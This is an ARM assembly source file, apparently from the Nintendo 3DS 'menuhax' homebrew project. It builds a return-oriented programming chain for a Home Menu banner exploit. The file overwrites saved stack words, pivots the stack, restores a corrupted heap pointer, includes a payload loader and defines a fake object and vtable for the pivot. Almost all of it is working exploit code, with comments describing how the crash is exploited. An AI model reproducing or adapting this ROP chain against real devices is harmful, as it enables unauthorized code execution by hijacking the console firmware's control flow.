.arm
.section .init
.global _start

#include "menuhax_ropinclude.s"

#define BOSSBANNERHAX_SPRETADDR 0x0fffff98//Address of SP right before the original stack-pivot was done.

_start:

ropstackstart:

@ Increase the saved LR used with the ret2menu stack-pivot data by 0xc, so that it jumps to the pop-instruction instead.
ROPMACRO_LDDRR0_ADDR1_STRADDR BOSSBANNERHAX_SPRETADDR+(5*4), BOSSBANNERHAX_SPRETADDR+(5*4), 0xc

@ BOSSBANNERHAX_SPRETADDR-(9*4) is the start of the data for POP_R4FPPC during stack-pivot.
ROPMACRO_WRITEWORD BOSSBANNERHAX_SPRETADDR-(4*4), ROP_LOADR4_FROMOBJR0_CALLERFUNC_R9VAL @ r9 value
ROPMACRO_WRITEWORD BOSSBANNERHAX_SPRETADDR-(3*4), ROP_LOADR4_FROMOBJR0_CALLERFUNC_SLVAL @ sl value
ROPMACRO_WRITEWORD BOSSBANNERHAX_SPRETADDR-(2*4), 0x1 @ fp value
ROPMACRO_WRITEWORD BOSSBANNERHAX_SPRETADDR-(1*4), POP_R4R8PC

@ Copy the ptr from <buffer allocated immediately after the decompression outbuf>+0x14 to +0x10. This restores the word overwritten at the end of bossbannerhax_banner.s.
ROPMACRO_COPYWORD FIXHEAPBUF+0x20224+0x10+0x10, FIXHEAPBUF+0x20224+0x10+0x14

#include "menuhax_loader.s"

@ The ROP used for RET2MENU starts here.

.word MAINLR_SVCEXITPROCESS @ Can't really ret2menu since there's some data that (probably) can't be restored properly. And also the exploit will trigger again the next time the user selects the application icon, which triggers another crash.

ROPMACRO_STACKPIVOT BOSSBANNERHAX_SPRETADDR-(9*4), POP_R4FPPC @ Return to executing the original homemenu code.

menuhaxloader_beforethreadexit:

@ Copy the addr from menuhax_payload beforethreadexit_return_spaddr to the word which will be popped into sp.
ROPMACRO_COPYWORD ROPBUFLOC(stackpivot_sploadword), MENUHAXLOADER_LOAD_BINADDR+12

@ Write to the word which will be popped into pc.
ROPMACRO_WRITEWORD ROPBUFLOC(stackpivot_pcloadword), ROP_POPPC

ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP

ROPMACRO_STACKPIVOT_JUMP

object:
.word ROPBUFLOC(vtable) @ object+0, vtable ptr
.word 0
.word 0
.word 0

.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
stackpivot_sploadword:
.word ROPBUFLOC(ropstackstart) @ sp
stackpivot_pcloadword:
.word ROP_POPPC @ pc

vtable:
.word 0, 0 @ vtable+0
.word 0//ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
.word 0//STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.

tmp_scratchdata:
.space 0x4

